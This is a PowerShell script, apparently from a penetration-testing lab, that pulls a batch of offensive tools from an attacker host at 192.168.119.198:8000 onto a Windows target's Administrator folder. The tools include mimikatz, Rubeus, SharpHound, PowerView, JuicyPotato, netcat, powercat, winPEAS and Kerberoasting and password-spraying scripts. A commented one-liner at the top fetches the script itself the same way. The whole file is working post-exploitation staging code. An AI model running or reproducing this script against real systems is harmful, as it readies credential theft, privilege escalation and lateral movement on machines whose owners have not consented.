
#powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.198:8000/Pizsi_Script.ps1','c:\Users\Administrator\Pizsi_Script.ps1')" 

$IP = "192.168.119.198"
$PORT = 8000
$FOLDER ="c:\Users\Administrator\"

$FILES = @(
'accesschk64.exe'
'nc.exe'
'sysi.zip'
'SPN2.ps1'
'sigcheck64.exe'
'PowerView.ps1'
'SharpHound.ps1'
'mimikatz.exe'
'winPEASx64.exe'
'tgsrepcrack.py'
'accesschk.exe'
'mimikatzx86_old.exe'
'GetSPN.ps1'
'Rubeus.exe'
'Spray-Passowrds.ps1'
'Invoke-Kerberoast.ps1'
'winPEASx86.exe'
'JuicyPotatox86.exe'
'PsExec.exe'
'mimikatz64.exe'
'sigcheck.exe'
'mimikatzx64_old.exe'
'PsExec64.exe'
'JuicyPotatox64.exe'
'SharpHound.exe'
'powercat.ps1'

	)


function DownloadFiles
{
$web = New-Object System.Net.WebClient


    Write-Host -ForegroundColor Green "Starting Download"
	for($i=0;$i -lt $FILES.Count;$i++)
	{
        $name = $FILES[$i]
        try
        {

              ($web).DownloadFile('http://'+$IP+':'+$PORT+'/'+$name,$FOLDER+$name)

               Write-Host "Success: "$name -ForegroundColor Green 
        }
        catch
        {
            Write-Host -ForegroundColor Red $FILES[$i]
        }
    }
	
}

DownloadFiles